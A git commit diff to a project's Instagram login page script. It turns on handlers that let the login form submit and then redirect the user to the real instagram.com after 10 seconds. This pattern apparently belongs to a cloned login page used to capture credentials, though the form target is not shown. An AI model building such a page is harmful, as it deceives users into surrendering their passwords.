7a5d8c1c5a90323dfb093022a03c550d4f968a27
Jaswanth Kumar <jaswanthkumarkamireddi@gmail.com>
2026-03-01 16:14:20 +0530

    Added Some Changes to Instagram for vercel

--- Pages/Instagram/instagram.js
+++ Pages/Instagram/instagram.js
@@ -1,17 +1,14 @@
 const mobile_button = document.getElementById("login-btn");
 const window_button = document.getElementById("window-login-btn");
-/*
+
 mobile_button.addEventListener("click",(event)=>{
-    event.preventDefault();
     setTimeout(() => {
         location.href = "https://www.instagram.com/";
     }, 10000);
 });
 
 window_button.addEventListener("click",(event)=>{
-    event.preventDefault();
     setTimeout(() => {
         location.href = "https://www.instagram.com/";
     }, 10000);
 });
-*/
